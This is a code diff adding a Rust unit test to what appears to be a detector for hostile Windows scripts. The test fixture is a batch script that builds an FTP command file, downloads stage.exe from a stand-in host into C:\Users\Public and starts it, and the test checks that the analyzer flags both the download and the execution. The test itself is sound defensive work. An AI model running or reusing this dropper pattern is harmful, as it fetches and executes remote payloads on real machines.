@@ -13740,6 +13740,43 @@ start C:\Users\Public\stage.exe"#,
     }
 
     #[test]
+    fn ftp_script_mget_single_file_is_downloaded() {
+        let report = analyze(
+            br#"echo open ftp-mget.example.net>f.scr
+echo cd payloads>>f.scr
+echo lcd C:\Users\Public>>f.scr
+echo mget stage.exe>>f.scr
+ftp.exe -s:f.scr
+start C:\Users\Public\stage.exe"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "ftp://ftp-mget.example.net/payloads/stage.exe"
+                            && dst.as_deref() == Some(r#"C:\Users\Public\stage.exe"#)
+                )
+            }),
+            "ftp script mget file was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"start C:\Users\Public\stage.exe"#
+                            && url == "ftp://ftp-mget.example.net/payloads/stage.exe"
+                )
+            }),
+            "later start did not resolve ftp mget destination: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ftp_current_dir_script_file_emits_remote_connect_and_download() {
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
